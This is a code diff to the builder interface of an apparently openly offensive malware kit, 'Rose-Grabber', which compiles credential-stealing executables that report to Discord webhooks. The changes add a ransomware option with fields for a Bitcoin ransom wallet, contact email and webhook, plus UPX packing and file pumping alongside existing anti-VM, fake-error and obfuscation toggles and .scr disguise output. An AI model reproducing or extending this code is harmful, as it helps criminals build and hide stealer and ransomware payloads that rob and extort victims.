@@ -39,7 +39,7 @@ gumbobr0ts_wallet_adr = "MY WALLET ADRESS HERE"
 
 __title__ = 'Rose UI Builder'
 __avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/$rose-b.png'
-__version__ = '1.6'
+__version__ = '1.7'
 __debugm__ = False # Change only if you are a dev 
 __icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/$rose-wh.png"
 __devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/roseui/msg.txt").text.splitlines()[0].split(" - ")
@@ -79,7 +79,12 @@ data_builder = {
     "icon_file": "",
     "obfuscation": False,
     "type_file": "",
-    "icon_path": ""
+    "icon_path": "",
+    "ransomware_btc_adress": "",
+    "ransomware_email": "",
+    "ransomware_webhook_url": "",
+    "ransomware": False,
+    "return_zip": False
 }
 
 links = {
@@ -144,7 +149,7 @@ async def test_webhook(webhook_url):
                 timestamp="now"
             )
             embed.set_author(name="Success", icon_url=__icon__)
-            embed.set_footer(text="Rose Builder | By pierro, suegdu, gumbobr0t, svn , Minecraft_killer", icon_url=__icon__)
+            embed.set_footer(text="Rose Builder | By pierro, suegdu, gumbobr0t, svn, Minecraft_killer", icon_url=__icon__)
             await hook.send(embed=embed, username='\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72', avatar_url='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x44\x61\x6d\x61\x67\x69\x6e\x67\x52\x6f\x73\x65\x2f\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72\x2f\x6d\x61\x69\x6e\x2f\x63\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2f\x72\x65\x61\x64\x6d\x65\x2f\x25\x32\x34\x72\x6f\x73\x65\x2d\x77\x68\x2e\x70\x6e\x67')
         return 0
     except Exception as e:
@@ -256,7 +261,11 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("fake_error = False", f"fake_error = {data_builder['fake_error']}") \
                 .replace("nitro_auto_buy = False", f"nitro_auto_buy = {data_builder['nitro_buy']}") \
                 .replace("antivm = False", f"antivm = {data_builder['antivm']}") \
-                .replace("webcam = False", f"webcam = {data_builder['webcam']}")
+                .replace("webcam = False", f"webcam = {data_builder['webcam']}") \
+                .replace("ransomware = False", f"ransomware = {data_builder['ransomware']}") \
+                .replace("RANSOMWARE_EMAIL_", f"{data_builder['ransomware_email']}") \
+                .replace("RANSOMWARE_BTC_ADRESS_", f"{data_builder['ransomware_btc_adress']}") \
+                .replace("RANSOMWARE_WEBHOOKURL", f"{data_builder['ransomware_webhook_url']}")
                  # noqa: E501
                 
             with open(f"{path}\\config.py", "w", encoding="utf-8") as f:
@@ -379,17 +388,20 @@ def _makebuild(q: Queue, data_builder) -> str:
         logger.info('Entering return_zip')
         homename = f'{data_builder["build_name"]}.scr' if data_builder["type_file"] == 'Screensaver (.scr)' else f'{data_builder["build_name"]}.exe'
 
-        with pyzipper.AESZipFile(zip_name, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as zipf:
-            zipf.setpassword(zip_passw.encode('utf-8'))
-            zipf.write(homename, os.path.basename(homename))
+        if data_builder["return_zip"]:
+            with pyzipper.AESZipFile(zip_name, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as zipf:
+                zipf.setpassword(zip_passw.encode('utf-8'))
+                zipf.write(homename, os.path.basename(homename))
         
         logger.info(f'Password for final zip is: {zip_passw}')
         logger.debug(f'Encrypted password for final zip is: {zip_passw.encode("utf-8")}')
 
-        try:
-            os.remove(homename)
-        except Exception as e:
-            logger.error(f"Error in removing file: {e}")
+        if data_builder["return_zip"]:
+            if os.path.exists(homename):
+                try:
+                    os.remove(homename)
+                except Exception as e:
+                    logger.error(f"Error in removing file: {e}")
 
         logger.info('Finished return_zip')
 
@@ -399,6 +411,10 @@ def _makebuild(q: Queue, data_builder) -> str:
         if data_builder["type_file"] == 'Screensaver (.scr)':
             os.rename(old_exe_path, new_scr_path)
         
+    def upx():
+        shutil.copy(os.path.join(os.getcwd(), "upx-4.1.0-win64", "upx.exe"), os.getcwd())
+        subprocess.run(f'upx -9kqvf {data_builder["build_name"]}.exe', shell=True)
+
     create_dir()
     q.put_nowait(0.1)
     get_files()
@@ -411,10 +427,12 @@ def _makebuild(q: Queue, data_builder) -> str:
     q.put_nowait(0.5)
     cleanup()
     q.put_nowait(0.6)
-    pump_file()
+    upx()
     q.put_nowait(0.7)
-    assign_extension()
+    pump_file()
     q.put_nowait(0.8)
+    assign_extension()
+    q.put_nowait(0.9)
     return_zip()
     q.put_nowait(1)
     #open_compile_log_button.visible = False
@@ -433,10 +451,14 @@ def select_icon():
 
 def _home():
     with ui.dialog() as dialog, ui.card():
-        ui.label(f'If the compilation process completed successfully, you should find the password protected zip archive within the designated folder. In case you encounter any issues, we kindly invite you to join our Discord community for further assistance.\nThe name of the zip archive is: {zip_name}\nThe password for the zip archive is: {zip_passw}')
+        if data_builder["return_zip"]:
+            ui.label(f'If the compilation process completed successfully, you should find the password protected zip archive within the designated folder. In case you encounter any issues, we kindly invite you to join our Discord community for further assistance.\nThe name of the zip archive is: {zip_name}\nThe password for the zip archive is: {zip_passw}')
+        else:
+            ui.label('If the compilation process completed successfully, you should find the executable file within the designated folder. In case you encounter any issues, we kindly invite you to join our Discord community for further assistance.')
         ui.button('Open Folder', on_click=lambda: os.startfile(Path(__file__).resolve().parent))
         ui.button('Join Discord', on_click=lambda: webbrowser.open(links["rose_discord"]))
-        ui.button('Copy password', on_click=lambda: pyperclip.copy(zip_passw))
+        if data_builder["return_zip"]:
+            ui.button('Copy password', on_click=lambda: pyperclip.copy(zip_passw))
         ui.button('Close', on_click=dialog.close)
         
     async def start_computation():
@@ -474,11 +496,12 @@ def _home():
             options=["Executable (.exe)", "Screensaver (.scr)"],#, "Batch (.bat)", "PowerShell (.ps1)", "Visual Basic Script (.vbs)"],
             on_change=lambda e: change_data('type_file', e.value)
         ).props("color=pink-3").classes('w-full')
-        ui.checkbox('Obfuscate source code', on_change=lambda e: change_data('obfuscation', e.value)).props('inline color=pink-3')  
+        ui.checkbox('Obfuscate source code', on_change=lambda e: change_data('obfuscation', e.value)).props('inline color=pink-3')
         with ui.row():
             _pumper = ui.checkbox('Pump file', on_change=lambda e: change_data('file_pumper', e.value)).props('inline color=pink-3')
             ui.input(label='Pump Size', placeholder='Size in MB',
                 on_change=lambda e: change_data('file_pumper_size', e.value)).bind_visibility_from(_pumper, 'value').props('inline color=pink-3')
+        ui.checkbox('Return password protected ZIP archive', on_change=lambda e: change_data('return_zip', e.value)).props('inline color=pink-3')
         ui.button(
             'Test Webhook',
             on_click=_test_webhook
@@ -549,7 +572,14 @@ def _functions():
                 ui.checkbox('Ping', on_change=lambda e: change_data('ping', e.value)).props('inline color=yellow-7')
                 ui.checkbox('Fake Error', on_change=lambda e: change_data('fake_error', e.value)).props('inline color=yellow-7')
                 ui.checkbox('Anti-VM', on_change=lambda e: change_data('antivm', e.value)).props('inline color=yellow-7')
-
+                with ui.row():
+                    _ransom = ui.checkbox('Rose Ransomware', on_change=lambda e: change_data('ransomware', e.value)).props('inline color=yellow-7')
+                    ui.input(label='Bitcoin Wallet adress', placeholder='Rose On Top baby!!!',
+                        on_change=lambda e: change_data('ransomware_btc_adress', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=yellow-7')
+                    ui.input(label='Webhook URL', placeholder='Rose On Top baby!!!',
+                        on_change=lambda e: change_data('ransomware_webhook_url', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=yellow-7')
+                    ui.input(label='Email adress', placeholder='Secured email adress here',
+                        on_change=lambda e: change_data('ransomware_email', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=yellow-7')
 
 def _github():
     with ui.card():
